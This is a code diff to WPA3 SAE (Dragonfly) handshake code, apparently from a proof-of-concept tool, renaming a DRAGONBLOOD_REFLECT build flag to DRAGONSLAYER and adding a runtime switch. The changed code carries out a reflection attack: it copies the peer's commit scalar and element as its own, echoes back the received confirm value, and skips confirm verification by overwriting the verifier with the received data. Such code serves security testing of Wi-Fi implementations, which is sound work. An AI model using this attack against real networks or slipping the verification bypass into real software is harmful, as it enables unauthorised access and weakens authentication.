@@ -713,9 +713,9 @@ static int sae_derive_commit(struct sae_data *sae)
 	    (sae->tmp->dh && sae_derive_commit_element_ffc(sae, mask) < 0))
 		goto fail;
 
-#ifdef DRAGONBLOOD_REFLECT
+#ifdef DRAGONSLAYER
 	/** Override the scalar and element with the peer's */
-	if (sae->peer_commit_scalar)
+	if (dragonslayer_reflect && sae->peer_commit_scalar)
 	{
 		/** own_commit_scalar = peer_commit_scalar */
 		crypto_bignum_setint(sae->tmp->own_commit_scalar, 0);
@@ -738,7 +738,7 @@ static int sae_derive_commit(struct sae_data *sae)
 			exit(1);
 		}
 	}
-#endif // DRAGONBLOOD_REFLECT
+#endif // DRAGONSLAYER
 
 	ret = 0;
 fail:
@@ -1395,25 +1395,30 @@ void sae_write_confirm(struct sae_data *sae, struct wpabuf *buf)
 	if (sae->send_confirm < 0xffff)
 		sae->send_confirm++;
 
-#ifndef DRAGONBLOOD_REFLECT
-	if (sae->tmp->ec)
-		sae_cn_confirm_ecc(sae, sc, sae->tmp->own_commit_scalar,
-				   sae->tmp->own_commit_element_ecc,
-				   sae->peer_commit_scalar,
-				   sae->tmp->peer_commit_element_ecc,
-				   wpabuf_put(buf, SHA256_MAC_LEN));
-	else
-		sae_cn_confirm_ffc(sae, sc, sae->tmp->own_commit_scalar,
-				   sae->tmp->own_commit_element_ffc,
-				   sae->peer_commit_scalar,
-				   sae->tmp->peer_commit_element_ffc,
-				   wpabuf_put(buf, SHA256_MAC_LEN));
-#else
-	/** Overwrite the confirm value */
-	memcpy(wpabuf_put(buf, SHA256_MAC_LEN), sae->received_confirm, SHA256_MAC_LEN);
+#ifndef DRAGONSLAYER
+	if (!dragonslayer_reflect)
+	{
+#endif // DRAGONSLAYER
+		if (sae->tmp->ec)
+			sae_cn_confirm_ecc(sae, sc, sae->tmp->own_commit_scalar,
+					   sae->tmp->own_commit_element_ecc,
+					   sae->peer_commit_scalar,
+					   sae->tmp->peer_commit_element_ecc,
+					   wpabuf_put(buf, SHA256_MAC_LEN));
+		else
+			sae_cn_confirm_ffc(sae, sc, sae->tmp->own_commit_scalar,
+					   sae->tmp->own_commit_element_ffc,
+					   sae->peer_commit_scalar,
+					   sae->tmp->peer_commit_element_ffc,
+					   wpabuf_put(buf, SHA256_MAC_LEN));
+#ifndef DRAGONSLAYER
+	} else {
+		/** Overwrite the confirm value */
+		memcpy(wpabuf_put(buf, SHA256_MAC_LEN), sae->received_confirm, SHA256_MAC_LEN);
 
-	poc_log("\x00\x00\x00\x00\x00\x00", "Reflecting received confirm value\n");
-#endif
+		poc_log("\x00\x00\x00\x00\x00\x00", "Reflecting received confirm value\n");
+	}
+#endif // DRAGONSLAYER
 }
 
 
@@ -1446,10 +1451,15 @@ int sae_check_confirm(struct sae_data *sae, const u8 *data, size_t len)
 				   sae->tmp->own_commit_element_ffc,
 				   verifier);
 
-#ifdef DRAGONBLOOD_REFLECT
-	memcpy(sae->received_confirm, data + 2, SHA256_MAC_LEN);
-	poc_log("\x00\x00\x00\x00\x00\x00", "Copied confirm from received Confirm frame\n");
-#else
+#ifdef DRAGONSLAYER
+	if (dragonslayer_reflect) {
+		memcpy(sae->received_confirm, data + 2, SHA256_MAC_LEN);
+		poc_log("\x00\x00\x00\x00\x00\x00", "Copied confirm from received Confirm frame\n");
+
+		// Don't verify the received confirm data
+		memcpy(verifier, data + 2, SHA256_MAC_LEN);
+	}
+#endif // DRAGONSLAYER
 	if (os_memcmp_const(verifier, data + 2, SHA256_MAC_LEN) != 0) {
 		wpa_printf(MSG_DEBUG, "SAE: Confirm mismatch");
 		wpa_hexdump(MSG_DEBUG, "SAE: Received confirm",
@@ -1458,7 +1468,6 @@ int sae_check_confirm(struct sae_data *sae, const u8 *data, size_t len)
 			    verifier, SHA256_MAC_LEN);
 		return -1;
 	}
-#endif
 
 	return 0;
 }
